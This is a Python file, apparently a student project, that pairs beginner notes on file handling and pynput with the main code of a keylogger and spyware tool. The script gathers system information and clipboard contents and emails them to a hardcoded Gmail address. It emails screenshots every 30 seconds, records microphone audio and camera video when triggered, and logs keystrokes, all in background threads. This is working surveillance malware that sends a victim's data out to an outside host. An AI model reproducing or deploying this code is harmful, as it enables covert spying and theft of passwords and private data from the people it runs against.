# BASIC CONCEPTS 
# FILE HANDLING USING PYTHON

# opening a file - f = open("file_name.txt", mode of opening)
# opening modes - w : write, r : read, a : append
# store the instance of the opened file in a variable for easy access to file later 
# f = open("sample.txt", 'a')

# writing to a file - write("Some Content")
# f.write('This is an example to demonstrate write func. in python')

# reading from a file - read()
# content = f.read() : save the file data in a variable for further use 

# appending to a file - append('New Content')
# adds the new content at the end of the file without deleting previous content
# f.append('This Line will be added to existing document without deleting prev data')

# to always start writing from new line insert \n 

# closing a file - f.close()
# releases the memory allocated to a variable to avoid any further errors

# with keyword - automatically releases memory when the need is over
# with open("sample.txt", 'a') as f:
#   f.write("Content")

# seek() - used to change the position of cursor in file handling
# syntax - f.seek(offset, from_where)
# offset : no. of position to be moved by cursor
# from_where : it has 3 values -> 0 - beginning of file, 1 - current position, 2 - end of file

# tell() - returns the current position/index of cursor in file

# EVENT LISTENERS IN PYTHON - using pynput library
# 1. Controlling Mouse
#       Import Controller from package - from pynput.mouse import Controller
#       Create a user defined func to control mouse - def controlMouse()
#       Call the controller function - mouse = Controller()
#       Change the mouse position - mouse.position = (x, y) { x - position along X - axis, y - Position along Y - axis } (in pixels)
# 2. Controlling KeyBoard 
#       Import Controller from package - from pynput.keyboard import Controller
#       Create a user defined func to control keyboard - def controlKeyBoard()
#       Call the controller function - keyboard = Controller()
#       Call the type() with the string that has to be typed as arguement
#       keyboard.type("This Line has been added by keyboard controller in pynput")
# ** We cannot control mouse and keyboard simultaneously using pynput package **

# 3. Listening For Keystrokes
# import Listener from package - from pynput.keyboard import Listener
# Listener(on_press = func. to be called)
# on_press - triggered whenever a key is pressed 
# i.e. detects key presses and passes it as parameter to the func. given to the listener object

# 4. Listening for Mouse Clicks
# import Listener from package - from pynput.mouse import Listener
# Listener(on_move = func. to be called)
# on_move - triggered whenever mouse position changes

# --------------------------------------------------------------------------------------------------------
#                                         Project Code Begins
# --------------------------------------------------------------------------------------------------------


# --------------------------------------------------------------------------------------------------------
#                                         IMPORTING LIBRARIES 

import os

# Importing file to get logged keys
import generateLogFile as klog

# Importing file to get system information
import getSystemInfo as sysInfo

# Importing Email Sender File
import emailSender as es

# Import file to copy clipboard
import getClipboardData as clip
import keyboard
import time

# For encrypting our logged files
import encryption as e

# For getting screenshots
import getScreenshot as ss
import uploadScreenshot

# For recording audio
import audioRecorder as adRec
import sounddevice as sd
import numpy as np

# For recording video
import videoRecorder as vdRec
import wmi

# For Multi-threading
# to create different threads to execute different tasks
import threading

# ---------------------------------------------------------------------------------------------------------

# SECTION - I
# Getting System Information
sysInfo.get_System_Information()


# commented due to simplicity concerns
# encrypt the system information file (if needed)
# e.encrypt_file_fernet_start("systemInfo.txt", True)
# sharing the encrypted file via mail
# es.shareViaMail("systemInfo.txt.enc", "systemInfo.txt.enc", "bongspatra@gmail.com", False)
    
# sharing the normal file via mail
es.shareViaMail("systemInfo.txt", "systemInfo.txt", "bongspatra@gmail.com", False)

# ---------------------------------------------------------------------------------------------------------

# SECTION - II
# Getting ClipBoard Content (whenever ctrl + c is detected)

def on_key_event(event):
    # detecting event when ctrl & c are pressed together
    if event.event_type == keyboard.KEY_DOWN and event.name == 'c' and keyboard.is_pressed('ctrl'):
        print("Ctrl + C detect")
        time.sleep(5)
        
        # copying clipboard information
        clip.copy_clipboard()
        
        # encrypt the file
        e.encrypt_file_fernet_start("clipboard.txt", True)
        
        # share the encrypted file via mail
        es.shareViaMail("clipboard.txt.enc", "clipboard.txt.enc" , "bongspatra@gmail.com", False)

# Initiatate the keyboard listener to listen for event i.e. ctrl + c detect
keyboard.on_press(on_key_event)

# ---------------------------------------------------------------------------------------------------------

# SECTION - III
# Getting Screenshot

def get_Periodic_SS():
    while True:
        print("Taking Screenshot")
        filename = ss.capture_screenshot()
        
        # share the captured screenshot by mail
        es.shareViaMail(filename, filename, "bongspatra@gmail.com", True)
        
        # upload the screenshot to mysql database - screenshot table
        # uploadScreenshot.uploadSS(filename)
        
        # delete the screenshot file after uploading ann sending
        try:
            os.remove(filename)
        except OSError as e:
            print(e)
        
        time.sleep(30)

# ---------------------------------------------------------------------------------------------------------

# SECTION - IV
# Audio Recorder

def listen_and_record(duration = 30, threshold = 7):
    while True:
        # Check if the microphone is activated by recording a short segment
        audio_data = sd.rec(int(0.5 * 44100), samplerate=44100, channels=2, dtype='int16')
        sd.wait()
        # Calculate the RMS (root mean square) of the audio data
        rms = np.sqrt(np.mean(audio_data**2))
        print(f"RMS level: {rms}")

        # If the RMS level exceeds the threshold, start recording
        if rms > threshold:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            filename = f"audio_recording_{timestamp}.wav"
            adRec.record_audio(duration, filename)
        time.sleep(1)
            
# ---------------------------------------------------------------------------------------------------------

# SECTION - V
# Video Recorder

def monitor_camera():
    c = wmi.WMI()
    watcher = c.Win32_Process.watch_for("creation")

    while True:
        try:
            process = watcher()
            if 'Camera' in process.Caption or 'camera' in process.Caption:
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                filename = f"video_recording_{timestamp}.avi"
                vdRec.record_video(filename)
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)

        
# ---------------------------------------------------------------------------------------------------------

# SECTION - VI
# KeyLogger 

def log_key_press_continuously():
    while True:
        print("KeyLogger Start")
        klog.start_keylogger()
        print("Keylogger Stop")
        time.sleep(1)
        
# ---------------------------------------------------------------------------------------------------------

# Creating Multiple Threads 

# Create the thread for the continuous tracking of keys - log_key_press_continuosly()
continuous_thread = threading.Thread(target=log_key_press_continuously, daemon=True)

# Create another thread which will continuously track microphone
# When the audio volume raise above certain level 
# Start recording for next 30 seconds - listen_and_record()
continuous_thread2 = threading.Thread(target=listen_and_record, daemon=True)

# Create another thread which will continuously monitor for camera
# When the camera app is started 
# Start recording for next 15 seconds - monitor_camera()
continuous_thread3 = threading.Thread(target= monitor_camera, daemon=True)

# Create the thread for the periodic function - get_periodic_ss()
periodic_thread = threading.Thread(target=get_Periodic_SS, daemon=True)

# Start the threads
continuous_thread.start()
continuous_thread2.start()
continuous_thread3.start()
periodic_thread.start()

# Since the threads run indefinitely, the main thread will also run indefinitely
# You can choose to use a more sophisticated method to stop threads gracefully
try:
    while True:
        time.sleep(1)  # Main thread doing nothing, just keeping the program alive
except KeyboardInterrupt:
    print("Program interrupted and exiting.")

# ---------------------------------------------------------------------------------------------------------


